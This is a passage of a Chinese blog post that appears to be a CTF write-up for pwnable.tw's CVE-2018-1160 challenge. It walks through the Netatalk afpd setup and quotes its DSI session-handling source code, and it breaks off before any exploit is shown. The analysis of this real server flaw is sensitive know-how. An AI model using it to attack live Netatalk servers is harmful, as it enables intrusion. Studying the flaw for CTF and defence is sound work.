<!DOCTYPE html><html lang="zh-CN" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="pwnable.tw CVE-2018-1160" /><meta property="og:locale" content="zh_CN" /><meta name="description" content="pwnable.tw于2020年新增题目CVE-2018-1160，分值100，题目曾出现在hitcon2019，1day漏洞利用。漏洞源自于一款开源的苹果AFP（Apple Filing Protocol）协议服务器程序Netatalk。和xuanxuan一起做了这道题。 可参考wp如下： CVE-2018-1160: Expanding the original 18 year old vulnerability exploit HITCON CTF 2019 Pwn 371 Netatalk Exploiting an 18 Year Old Bug (漏洞发现者原文) 和徐老一起学Pwn 之 Pwnable CVE-2018-1160 CVE-2018-1160 netatalk越界漏洞复现及分析 Netatalk CVE-2018-1160 分析" /><meta property="og:description" content="pwnable.tw于2020年新增题目CVE-2018-1160，分值100，题目曾出现在hitcon2019，1day漏洞利用。漏洞源自于一款开源的苹果AFP（Apple Filing Protocol）协议服务器程序Netatalk。和xuanxuan一起做了这道题。 可参考wp如下： CVE-2018-1160: Expanding the original 18 year old vulnerability exploit HITCON CTF 2019 Pwn 371 Netatalk Exploiting an 18 Year Old Bug (漏洞发现者原文) 和徐老一起学Pwn 之 Pwnable CVE-2018-1160 CVE-2018-1160 netatalk越界漏洞复现及分析 Netatalk CVE-2018-1160 分析" /><link rel="canonical" href="https://gtrboy.github.io/posts/netatalk/" /><meta property="og:url" content="https://gtrboy.github.io/posts/netatalk/" /><meta property="og:site_name" content="gtrboy’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-08T08:20:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="pwnable.tw CVE-2018-1160" /><meta name="twitter:site" content="@" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-08T08:20:00+08:00","datePublished":"2021-11-08T08:20:00+08:00","description":"pwnable.tw于2020年新增题目CVE-2018-1160，分值100，题目曾出现在hitcon2019，1day漏洞利用。漏洞源自于一款开源的苹果AFP（Apple Filing Protocol）协议服务器程序Netatalk。和xuanxuan一起做了这道题。 可参考wp如下： CVE-2018-1160: Expanding the original 18 year old vulnerability exploit HITCON CTF 2019 Pwn 371 Netatalk Exploiting an 18 Year Old Bug (漏洞发现者原文) 和徐老一起学Pwn 之 Pwnable CVE-2018-1160 CVE-2018-1160 netatalk越界漏洞复现及分析 Netatalk CVE-2018-1160 分析","headline":"pwnable.tw CVE-2018-1160","mainEntityOfPage":{"@type":"WebPage","@id":"https://gtrboy.github.io/posts/netatalk/"},"url":"https://gtrboy.github.io/posts/netatalk/"}</script><title>pwnable.tw CVE-2018-1160 | gtrboy's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="gtrboy's blog"><meta name="application-name" content="gtrboy's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">gtrboy's blog</a></div><div class="site-subtitle font-italic">a dead beef</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/gtrboy" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gtboy.dream','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>pwnable.tw CVE-2018-1160</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>pwnable.tw CVE-2018-1160</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> gtrboy </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Nov 8, 2021, 8:20 AM +0800" prep="on" > Nov 8, 2021 <i class="unloaded">2021-11-08T08:20:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6635 words">36 min</span></div></div><div class="post-content"><blockquote><p>pwnable.tw于2020年新增题目CVE-2018-1160，分值100，题目曾出现在hitcon2019，1day漏洞利用。漏洞源自于一款开源的苹果AFP（Apple Filing Protocol）协议服务器程序Netatalk。和xuanxuan一起做了这道题。</p><p>可参考wp如下：</p><ul><li><a href="https://tacopwn.net/blog/2021/08/02/cve-2018-1160-expanding-the-original-18-year-old-vulnerability-exploit/">CVE-2018-1160: Expanding the original 18 year old vulnerability exploit</a><li><a href="https://ddaa.tw/hitconctf_pwn_371_netatalk.html">HITCON CTF 2019 Pwn 371 Netatalk</a><li><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172">Exploiting an 18 Year Old Bug (漏洞发现者原文)</a><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/">和徐老一起学Pwn 之 Pwnable CVE-2018-1160</a><li><a href="https://ama2in9.top/2021/01/07/cve-2018-1160/">CVE-2018-1160 netatalk越界漏洞复现及分析</a><li><a href="https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/">Netatalk CVE-2018-1160 分析</a></ul></blockquote><h1 id="0x00-程序分析">0x00 程序分析</h1><h2 id="题目信息">题目信息</h2><p><img data-proofer-ignore data-src="/img/netatalk/timu.png" alt="question" /> 题目提供了如下信息：</p><ul><li>老版本的Netatalk包含了一些1day漏洞，比如CVE-2018-1160。查询后发现漏洞对应的程序版本为<a href="https://sourceforge.net/projects/netatalk/files/">netatalk 3.1.11</a>。<li>提供了服务器内核版本<li>libc，版本为2.27，除Partial RELRO外，保护全开<li>程序afpd，保护全开<li>程序依赖库libatalk.so.18，除Partial RELRO外，保护全开<li>程序配置文件afp.conf，内容包括监听端口（5566），超时时间（0），最大连接数（1000），sleep time（0）</ul><p><img data-proofer-ignore data-src="/img/netatalk/checksec_libc.png" alt="checksec_libc" /><img data-proofer-ignore data-src="/img/netatalk/checksec_afpd.png" alt="checksec_afpd" /> <img data-proofer-ignore data-src="/img/netatalk/checksec_libatalk.png" alt="checksec_libatalk" /><img data-proofer-ignore data-src="/img/netatalk/afpconf.png" alt="afpdconf" /></p><h2 id="程序加载">程序加载</h2><p>ubuntu 18.04环境下执行：</p><p><code class="language-plaintext highlighter-rouge">LD_PRELOAD=./libc-2.27.so LD_LIBRARY_PATH=./ ./afpd -d -F ./afp.conf</code></p><h2 id="程序流程">程序流程</h2><h3 id="dsi_start">dsi_start()</h3><p>main()函数首先进行一系列初始化工作，包括解析配置文件，初始化socket、初始化dsi结构体等，之后调用dsi_start()函数。该函数首先调用dsi_getsession()函数获取TCP会话，解析请求消息，之后调用afp_over_dsi()函数进行会话内容的处理。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="n">afp_child_t</span> <span class="o">*</span><span class="nf">dsi_start</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">,</span> <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">server_children</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">afp_child_t</span> <span class="o">*</span><span class="n">child</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi_getsession</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_children</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">.</span><span class="n">tickleval</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"dsi_start: session error: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* we've forked. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">configfree</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">dsi</span><span class="p">);</span>
        <span class="n">afp_over_dsi</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span> <span class="cm">/* start a session */</span>
        <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">child</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="dsi_getsession">dsi_getsession()</h3><p>该函数开启一个DSI会话，从TCP socket接收会话消息，保存至结构体DSI中。 函数首先调用dsi-&gt;proto_open(dsi)进行TCP消息的接收和处理，该函数实体为dsi_tcp_open()。根据返回值是父进程还是子进程，进入不同的处理逻辑。父进程则直接返回，继续监听，子进程则进入之后的DSI消息处理逻辑，根据dsi_command的值（下面在结构体中介绍），选择不同的处理方式，若dsi_command为DSIFUNC_OPEN，则调用dsi_opensession()函数，初始化DSI会话。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">dsi_getsession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">,</span> <span class="n">server_child_t</span> <span class="o">*</span><span class="n">serv_children</span><span class="p">,</span> <span class="kt">int</span> <span class="n">tickleval</span><span class="p">,</span> <span class="n">afp_child_t</span> <span class="o">**</span><span class="n">childp</span><span class="p">)</span>
<span class="p">{</span>

  <span class="p">......</span>

  <span class="k">switch</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_open</span><span class="p">(</span><span class="n">dsi</span><span class="p">))</span> <span class="p">{</span> <span class="cm">/* in libatalk/dsi/dsi_tcp.c */</span>
  <span class="k">case</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
    <span class="cm">/* if we fail, just return. it might work later */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_getsess: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="k">case</span> <span class="mi">0</span><span class="p">:</span> <span class="cm">/* child. mostly handled below. */</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* parent */</span>
    <span class="cm">/* using SIGKILL is hokey, but the child might not have
     * re-established its signal handler for SIGTERM yet. */</span>

    <span class="p">......</span>

    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="n">child</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="p">......</span>

  <span class="k">switch</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">case</span> <span class="n">DSIFUNC_STAT</span><span class="p">:</span> <span class="cm">/* send off status and return */</span>
    <span class="p">......</span>
    
  <span class="k">case</span> <span class="n">DSIFUNC_OPEN</span><span class="p">:</span> <span class="cm">/* setup session */</span>
    <span class="cm">/* set up the tickle timer */</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">tickleval</span><span class="p">;</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">dsi_opensession</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* just close */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_info</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"DSIUnknown %d"</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="两个重要结构体">两个重要结构体</h3><p>先介绍两个重要的结构体。其中dsi_block为dsi消息头部，DSI结构体保存了会话的所有重要信息，其中commands指针指向了TCP会话发送来的命令消息。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="cp">#define DSI_BLOCKSIZ 16
</span><span class="k">struct</span> <span class="nc">dsi_block</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">dsi_flags</span><span class="p">;</span>       <span class="cm">/* packet type: request or reply */</span>
    <span class="kt">uint8_t</span> <span class="n">dsi_command</span><span class="p">;</span>     <span class="cm">/* command */</span>
    <span class="kt">uint16_t</span> <span class="n">dsi_requestID</span><span class="p">;</span>  <span class="cm">/* request ID */</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="kt">uint32_t</span> <span class="n">dsi_code</span><span class="p">;</span>   <span class="cm">/* error code */</span>
        <span class="kt">uint32_t</span> <span class="n">dsi_doff</span><span class="p">;</span>   <span class="cm">/* data offset */</span>
    <span class="p">}</span> <span class="n">dsi_data</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">dsi_len</span><span class="p">;</span>        <span class="cm">/* total data length */</span>
    <span class="kt">uint32_t</span> <span class="n">dsi_reserved</span><span class="p">;</span>   <span class="cm">/* reserved field */</span>
<span class="p">};</span>

<span class="cp">#define DSI_DATASIZ       65536
</span>
<span class="cm">/* child and parent processes might interpret a couple of these
 * differently. */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">DSI</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">DSI</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>             <span class="cm">/* multiple listening addresses */</span>
    <span class="n">AFPObj</span>   <span class="o">*</span><span class="n">AFPobj</span><span class="p">;</span>
    <span class="kt">int</span>      <span class="n">statuslen</span><span class="p">;</span>
    <span class="kt">char</span>     <span class="n">status</span><span class="p">[</span><span class="mi">1400</span><span class="p">];</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">signature</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">dsi_block</span>        <span class="n">header</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">sockaddr_storage</span> <span class="n">server</span><span class="p">,</span> <span class="n">client</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">itimerval</span>        <span class="n">timer</span><span class="p">;</span>
    <span class="kt">int</span>      <span class="n">tickle</span><span class="p">;</span>            <span class="cm">/* tickle count */</span>
    <span class="kt">int</span>      <span class="n">in_write</span><span class="p">;</span>          <span class="cm">/* in the middle of writing multiple packets,
                                   signal handlers can't write to the socket */</span>
    <span class="kt">int</span>      <span class="n">msg_request</span><span class="p">;</span>       <span class="cm">/* pending message to the client */</span>
    <span class="kt">int</span>      <span class="n">down_request</span><span class="p">;</span>      <span class="cm">/* pending SIGUSR1 down in 5 mn */</span>

    <span class="kt">uint32_t</span> <span class="n">attn_quantum</span><span class="p">,</span> <span class="n">datasize</span><span class="p">,</span> <span class="n">server_quantum</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">serverID</span><span class="p">,</span> <span class="n">clientID</span><span class="p">;</span>
    <span class="kt">uint8_t</span>  <span class="o">*</span><span class="n">commands</span><span class="p">;</span> <span class="cm">/* DSI recieve buffer */</span>
    <span class="kt">uint8_t</span>  <span class="n">data</span><span class="p">[</span><span class="n">DSI_DATASIZ</span><span class="p">];</span>    <span class="cm">/* DSI reply buffer */</span>
    <span class="kt">size_t</span>   <span class="n">datalen</span><span class="p">,</span> <span class="n">cmdlen</span><span class="p">;</span>
    <span class="kt">off_t</span>    <span class="n">read_count</span><span class="p">,</span> <span class="n">write_count</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">flags</span><span class="p">;</span>             <span class="cm">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span>
    <span class="kt">int</span>      <span class="n">socket</span><span class="p">;</span>            <span class="cm">/* AFP session socket */</span>
    <span class="kt">int</span>      <span class="n">serversock</span><span class="p">;</span>        <span class="cm">/* listening socket */</span>

    <span class="cm">/* DSI readahead buffer used for buffered reads in dsi_peek */</span>
    <span class="kt">size_t</span>   <span class="n">dsireadbuf</span><span class="p">;</span>        <span class="cm">/* size of the DSI readahead buffer used in dsi_peek() */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>           <span class="cm">/* buffer start */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">start</span><span class="p">;</span>            <span class="cm">/* current buffer head */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">eof</span><span class="p">;</span>              <span class="cm">/* end of currently used buffer */</span>
    <span class="kt">char</span>     <span class="o">*</span><span class="n">end</span><span class="p">;</span>

<span class="cp">#ifdef USE_ZEROCONF
</span>    <span class="kt">char</span> <span class="o">*</span><span class="n">bonjourname</span><span class="p">;</span>      <span class="cm">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span>
    <span class="kt">int</span> <span class="n">zeroconf_registered</span><span class="p">;</span>
<span class="cp">#endif
</span>
    <span class="cm">/* protocol specific open/close, send/receive
     * send/receive fill in the header and use dsi-&gt;commands.
     * write/read just write/read data */</span>
    <span class="n">pid_t</span>  <span class="p">(</span><span class="o">*</span><span class="n">proto_open</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">DSI</span> <span class="o">*</span><span class="p">);</span>
    <span class="kt">void</span>   <span class="p">(</span><span class="o">*</span><span class="n">proto_close</span><span class="p">)(</span><span class="k">struct</span> <span class="nc">DSI</span> <span class="o">*</span><span class="p">);</span>
<span class="p">}</span> <span class="n">DSI</span><span class="p">;</span>

</pre></table></code></div></div><h3 id="dsi_tcp_open">dsi_tcp_open()</h3><p>该函数首先会<strong>调用fork()函数建立新的子进程</strong>，并在子进程中执行如下逻辑：先从TCP会话中读取DSI header到结构体dsi-&gt;header，之后读取DSI payload内容放在dsi-&gt;commands指向的buf中。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="n">pid_t</span> <span class="nf">dsi_tcp_open</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">SOCKLEN_T</span> <span class="n">len</span><span class="p">;</span>

    <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">socket</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">serversock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

    <span class="p">......</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">socket</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">getitimer</span><span class="p">(</span><span class="n">ITIMER_PROF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">itimer</span><span class="p">);</span>
    <span class="cm">/* 建立子进程 */</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="p">(</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
        <span class="k">static</span> <span class="k">struct</span> <span class="nc">itimerval</span> <span class="n">timer</span> <span class="o">=</span> <span class="p">{</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">},</span> <span class="p">{</span><span class="n">DSI_TCPTIMEOUT</span><span class="p">,</span> <span class="mi">0</span><span class="p">}};</span>
        <span class="k">struct</span> <span class="nc">sigaction</span> <span class="n">newact</span><span class="p">,</span> <span class="n">oldact</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="n">block</span><span class="p">[</span><span class="n">DSI_BLOCKSIZ</span><span class="p">];</span>
        <span class="kt">size_t</span> <span class="n">stored</span><span class="p">;</span>
    
    <span class="p">......</span>

        <span class="n">dsi_init_buffer</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>

        <span class="cm">/* read in commands. this is similar to dsi_receive except
         * for the fact that we do some sanity checking to prevent
         * delinquent connections from causing mischief. */</span>

        <span class="cm">/* 先读两个字节 */</span>
